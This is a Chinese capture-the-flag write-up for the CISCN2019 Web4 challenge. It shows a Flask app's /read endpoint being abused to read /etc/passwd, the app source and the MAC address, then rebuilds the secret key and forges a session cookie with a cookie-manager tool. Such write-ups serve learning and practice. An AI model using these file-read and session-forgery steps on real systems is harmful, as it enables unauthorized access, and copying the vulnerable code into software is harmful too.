# [CISCN2019 华东南赛区]Web4

## 知识点

`flask默认路径`

`flask session伪造`

## 解题

题目给了一个超链接，点击直接跳转`www.baidu.com`

http://b47d411e-69a9-4a81-bba0-f69f72700897.node5.buuoj.cn:81/read?url=www.baidu.com

尝试修改`url`参数为`/flag`无法读取，改为`/etc/passwd`可以读取文件，发现路径为`/read`，可能是`python`考点，尝试访问`url=/app/app.py`，发现给出了源码

```python

# encoding:utf-8
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )
```

发现只需要`session['username']`为`fuck`可以获取`flag`

`SECRET_KEY`为`uuid.getnode()`,`uuid.getnode()`是对`mac`地址处理的函数，获取mac地址，`/sys/class/net/eth0/address`，然后使用代码生成

```python
import random

mac="a6:ae:06:e4:cb:90"
nmac=mac.replace(":", "")
random.seed(int(nmac,16))
key = str(random.random() * 233)
print(key)
```

然后使用

```bash
$ python2 flask_session_cookie_manager2.py decode -c "eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Zm2O7w.aOVOCuWRIsp1ysa1Sq6oJErp_wM"
{"username":{" b":"d3d3LWRhdGE="}
```

```bash
$ python3 flask_session_cookie_manager3.py encode -s 125.797313223 -t "{'username':'fuck'}"
eyJ1c2VybmFtZSI6ImZ1Y2sifQ.Zm2TaA.kovIqZ-NdRstTucaiThZz-FJOwU
```

